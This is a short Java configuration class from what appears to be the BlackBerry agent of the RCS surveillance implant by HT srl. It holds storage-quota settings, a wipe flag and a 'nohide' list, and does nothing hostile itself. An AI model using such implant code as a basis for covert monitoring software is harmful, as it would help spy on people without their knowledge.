//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.config;

public class Globals {
    private static final int QUOTA_MIN = 10 * 1024;
    public int quotaMin;
    public int quotaMax;
    public boolean wipe;
    public String type;
    public boolean migrated;
    public int version;
    public String[] nohide;

    public long getQuotaMin() {
        return Math.max(quotaMin, QUOTA_MIN);
    }

}
